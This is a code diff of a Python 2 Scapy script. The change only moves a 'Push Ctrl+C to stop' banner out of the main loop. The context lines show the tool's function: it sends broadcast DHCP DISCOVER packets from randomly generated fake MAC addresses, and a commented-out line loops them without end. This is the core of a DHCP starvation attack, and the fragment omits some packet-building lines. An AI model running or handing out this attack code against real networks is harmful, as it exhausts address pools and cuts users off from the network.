@@ -29,6 +29,12 @@ def main(argv):
 
     print "Interface: " + conf.iface
 
+    print """
+        ***                                           ***
+        *** Push Ctrl+C to stop after several seconds ***
+        ***                                           ***
+        """
+
     for x in range(255): # send 255 packet with fakes macs
         src_mac = str(RandMAC())
         ether = Ether(dst='ff:ff:ff:ff:ff:ff',src=src_mac)
@@ -38,11 +44,7 @@ def main(argv):
         dhcp = DHCP(options=[("message-type", "discover"), "end"])
         packet = ether/ip/udp/bootp/dhcp    # create packet
         packet.show() #show info to generated packet
-        print """
-        ***                                           ***
-        *** Push Ctrl+C to stop after several seconds ***
-        ***                                           ***
-        """
+
     #sendp(packet,loop=1) # send a packet countless times
         sendp(packet)
 
